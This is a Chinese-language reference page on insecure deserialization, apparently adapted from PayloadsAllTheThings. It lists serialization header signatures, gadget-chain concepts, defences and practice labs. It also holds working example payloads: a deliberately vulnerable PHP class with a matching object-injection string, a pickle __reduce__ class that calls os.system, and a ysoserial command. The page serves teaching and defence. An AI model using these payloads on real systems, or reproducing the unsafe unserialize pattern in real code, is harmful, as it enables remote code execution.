# Insecure Deserialization - 不安全反序列化

[SEARCH_KEYWORDS]
漏洞类型: Insecure Deserialization 不安全反序列化 反序列化漏洞
攻击类型: RCE Remote Code Execution Object Injection Gadget Chain
关键词: serialize deserialize unserialize pickle yaml phar java serialization
语言: Java PHP Python Ruby .NET
工具: ysoserial phpggc pickle PyYAML ysoserial.net
技术: POP Gadget Chain Property Oriented Programming

[CONTENT]

## 反序列化漏洞概述

序列化是将对象转换为可恢复的数据格式的过程。反序列化是该过程的逆过程——从某种格式的数据重建对象。不安全的反序列化是指应用程序在反序列化不可信数据时，可能导致任意代码执行。

## 反序列化识别

### 头部标识

| 对象类型 | Header (Hex) | Header (Base64) |
|----------|--------------|-----------------|
| Java Serialized | AC ED | rO |
| .NET ViewState | FF 01 | /w |
| Python Pickle | 80 04 95 | gASV |
| PHP Serialized | 4F 3A | Tz |

## 各语言反序列化

### Java反序列化

详见 Java.md，使用 ysoserial 等工具。

### PHP反序列化 (Object Injection)

详见 PHP.md，使用 phpggc 等工具。

### Ruby反序列化

详见 Ruby.md，使用 universal rce gadget。

### Python反序列化

详见 Python.md，包括 pickle、PyYAML 等。

### .NET反序列化

详见 DotNET.md，使用 ysoserial.net 等工具。

## POP Gadgets

POP (Property Oriented Programming) gadget 是在反序列化过程中可以被调用的应用程序类代码片段。

### POP Gadget 特征

- 可序列化
- 具有公共/可访问的属性
- 实现特定的易受攻击方法
- 可以访问其他"可调用"类

## 反序列化攻击示例

### PHP Object Injection

```php
<?php
class VulnerableClass {
    public $command;
    function __destruct() {
        system($this->command);
    }
}
unserialize($_GET['data']);
?>
```

Payload:
```php
O:16:"VulnerableClass":1:{s:7:"command";s:6:"whoami";}
```

### Python Pickle

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
```

### Java

使用 ysoserial 生成 payload:
```bash
java -jar ysoserial.jar CommonsCollections1 'whoami'
```

## 防御措施

1. 避免反序列化不可信数据
2. 使用安全的序列化格式（如JSON）
3. 实施完整性检查（如数字签名）
4. 限制反序列化的类
5. 使用沙箱环境

## Labs实验室

- PortSwigger - Modifying serialized objects
- PortSwigger - Exploiting Java deserialization with Apache Commons
- PortSwigger - Exploiting PHP deserialization with a pre-built gadget chain
- PortSwigger - Exploiting Ruby deserialization using a documented gadget chain
- NickstaDB - DeserLab

## 工具

- ysoserial - Java反序列化利用工具
- ysoserial.net - .NET反序列化利用工具
- phpggc - PHP反序列化gadget链
- marshalsec - Java反序列化研究工具

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Deserialization/README.md